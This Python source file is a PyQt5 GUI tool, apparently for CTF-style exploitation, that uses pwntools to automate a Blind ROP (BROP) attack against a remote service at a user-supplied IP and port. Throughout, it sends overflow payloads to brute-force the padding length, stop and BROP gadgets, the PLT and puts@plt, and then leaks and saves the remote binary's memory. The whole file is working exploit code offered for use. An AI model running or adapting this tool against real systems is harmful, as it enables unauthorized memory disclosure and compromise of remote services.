import sys
from tokenize import maybe
from pwn import *
from PyQt5.QtWidgets import QApplication, QMainWindow
from blindui import Ui_MainWindow

context.log_level = "debug"
context.arch = 'amd64'

class MyMainWindow(QMainWindow, Ui_MainWindow):
    target_ip = ""
    target_port=0
    dump_target=""
    strat_str=""
    end_str = ""
    elfload = 0
    padding_length = 0
    stop_gadget= 0
    brop_gadget= 0
    plt=0
    puts_plt=0
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)
    def find_padding(self):
        self.off_b.clicked.connect(self.Force_find_padding)
    def get_base_information(self):
        self.target_ip = self.ip.text()
        self.target_port = int(self.port.text())
        self.dump_target = self.dumpfile.text()
        self.strat_str = self.start_str.text()
        self.end_str = self.end_start.text()
        self.elfload = int(self.elf_load.text(),16)
    def Force_find_padding(self):
        self.get_base_information()
        print (self.target_port)
        print (self.end_str)
        print (self.strat_str)
        padding_length = 0
        while True:
            try:
                padding_length=padding_length+1
                io = remote(self.target_ip,self.target_port)
                io.recvuntil(self.strat_str)
                io.send(b'A' * padding_length)
                if self.end_str.encode('utf-8') not in io.recvall(timeout=1):
                    raise "Programe not exit normally!"
                io.close()
            except:
                log.success("The true padding length is "+str(padding_length-1))
                self.padding_length = padding_length-1
                self.off.setText(str(self.padding_length))
                return
        log.error("We don't find true padding length!")

    def find_stop_gadget(self):
        self.stop_b.clicked.connect(self.Find_stop_gadget)
    def Find_stop_gadget(self):
        self.get_base_information()
        self.padding_length=int(self.off.text())
        maybe_low_byte=0x0000
        if self.stop.text() != "":
            maybe_low_byte = int(self.stop.text(),16) & 0xffff
        while True:
            try:
                log.success("now maybe_low_byte is : "+hex(maybe_low_byte))
                io = remote(self.target_ip,self.target_port)
                io.recvuntil(self.strat_str)
                io.send(b'A' * self.padding_length+p16(maybe_low_byte))
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if self.strat_str.encode('utf-8') in io.recvall(timeout=1):
                    log.success("We found a stop gadget is " + hex(self.elfload+maybe_low_byte))
                    self.stop_gadget = self.elfload+maybe_low_byte
                    self.stop.setText(hex(self.stop_gadget))
                    return
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                io.close()

    def find_brop_gadget(self):
        self.brop_b.clicked.connect(self.Find_brop_gadget)

    def Find_brop_gadget(self):
        self.get_base_information()
        self.padding_length=int(self.off.text())
        self.stop_gadget = int(self.stop.text(),16)
        maybe_low_byte=0x0000
        if self.brop.text() != "":
                maybe_low_byte = int(self.brop.text(),16) & 0xffff
        while True:
            try:
                log.success("now maybe_low_byte is : "+hex(maybe_low_byte))
                io = remote(self.target_ip,self.target_port)
                io.recvuntil(self.strat_str)
                payload  = b'A' * self.padding_length 
                payload += p64(self.elfload+maybe_low_byte) 
                payload += p64(0)*6
                payload += p64(self.stop_gadget) +p64(0)*10
                io.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if self.strat_str.encode('utf-8') in io.recvall(timeout=1):
                    log.success("We found a brop gadget is " + hex(self.elfload+maybe_low_byte))
                    self.brop_gadget=self.elfload+maybe_low_byte
                    self.brop.setText(hex(self.brop_gadget))
                    return
                maybe_low_byte=maybe_low_byte+1
            except:
                pass
                io.close()
    def find_plt(self):
        self.plt_b.clicked.connect(self.Find_plt)
    def Find_plt(self):
        self.get_base_information()
        self.padding_length=int(self.off.text())
        self.stop_gadget = int(self.stop.text(),16)
        maybe_low_byte=0x0000
        if self.plt_maybe.text() != "":
                maybe_low_byte = int(self.plt_maybe.text(),16) & 0xffff
        while True:
            try:
                payload1 = b'a' * self.padding_length + p64(self.elfload+maybe_low_byte)+p64(self.stop_gadget)
                payload2 = b'a' * self.padding_length + p64(self.elfload+maybe_low_byte+6)+p64(self.stop_gadget)
                io = remote(self.target_ip,self.target_port)
                io.recvuntil(self.strat_str)
                io.send(payload1)
                if self.strat_str.encode('utf-8') in io.recvall(timeout=1):
                    io.close()
                    io = remote(self.target_ip,self.target_port)
                    io.recvuntil(self.strat_str)
                    io.send(payload2)
                    if self.strat_str.encode('utf-8') in io.recvall(timeout=1):
                        self.plt=self.elfload+maybe_low_byte - 0x10
                        self.plt_maybe.setText(hex(self.plt))
                        log.success("We found a plt gadget is " + hex(self.plt))
                        return 
                maybe_low_byte = maybe_low_byte + 0x10
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
            except:
                pass
                io.close()
    def find_puts_plt(self):
        self.puts_b.clicked.connect(self.Find_puts_plt)
    def Find_puts_plt(self):
        self.get_base_information()
        self.padding_length=int(self.off.text())
        self.stop_gadget = int(self.stop.text(),16)
        self.plt=int(self.plt_maybe.text(),16)
        self.brop_gadget= int(self.brop.text(),16)
        maybe_low_byte=self.plt & 0xffff-0x50
        if self.puts_addr.text() != "":
                maybe_low_byte = int(self.plt_maybe.text(),16) & 0xffff
        while True:
            try:
                io = remote(self.target_ip,self.target_port)
                io.recvuntil(self.strat_str)
                payload  = b'A' * self.padding_length 
                payload += p64(self.brop_gadget+9) # pop rdi;ret;
                payload += p64(self.elfload)
                payload += p64(self.elfload+maybe_low_byte)
                payload += p64(self.stop_gadget)
                io.send(payload)
                if maybe_low_byte > 0xFFFF:
                    log.error("All low byte is wrong!")
                if b"\x7fELF" in io.recvall(timeout=3):
                    self.puts_plt=self.elfload+maybe_low_byte
                    self.puts_addr.setText(hex(self.puts_plt))
                    log.success("We found a puts_plt gadget is " + hex(self.puts_plt))
                    return
                maybe_low_byte=maybe_low_byte+0x1
            except:
                pass
                io.close()
    def dump(self):
        self.dump_b.clicked.connect(self.Dump_file)
    def Dump_file(self):
        self.get_base_information()
        self.padding_length=int(self.off.text())
        self.stop_gadget = int(self.stop.text(),16)
        self.plt=int(self.plt_maybe.text(),16)
        self.brop_gadget= int(self.brop.text(),16)
        self.puts_plt=int(self.puts_addr.text(),16)
        pop_rdi_ret=self.brop_gadget+9
        if pop_rdi_ret&0xff00 == 0:
            gadget_len=1
        elif pop_rdi_ret&0xff == 0:
            gadget_len=2
        else:
            gadget_len = 3
        one='\x0a'+self.one_strs.text()
        old_length=0
        new_length=0
        file_content=b''
        while True:
            try:
                io = remote(self.target_ip,self.target_port)
                while True:
                    io.recvuntil(self.strat_str)
                    payload  = b'A' * (self.padding_length - len('Begin_leak----->'))
                    payload += b'Begin_leak----->'
                    payload += p64(self.brop_gadget+9) # pop rdi;ret;
                    payload += p64(self.elfload+new_length)
                    payload += p64(self.puts_plt)
                    payload += p64(self.stop_gadget)
                    io.send(payload)
                    io.recvuntil(b'Begin_leak----->')
                    received_data = io.recvuntil(one)[gadget_len:-len(one)]
                    if len(received_data) == 0 :
                        file_content += b'\x00'
                        new_length += 1
                    else :
                        file_content += received_data
                        new_length += len(received_data)
                    io.close()
            except:
                if new_length == old_length :
                    log.info('We get ' + str(old_length) +' byte file!')
                    with open(self.dump_target,'wb') as fout:
                        fout.write(file_content)
                    return
                old_length = new_length
                io.close()
                pass

if __name__ == "__main__":
    app = QApplication(sys.argv)
    myWin = MyMainWindow()
    myWin.show()
    myWin.find_padding()
    myWin.find_stop_gadget()
    myWin.find_brop_gadget()
    myWin.find_plt()
    myWin.find_puts_plt()
    myWin.dump()
    sys.exit(app.exec_())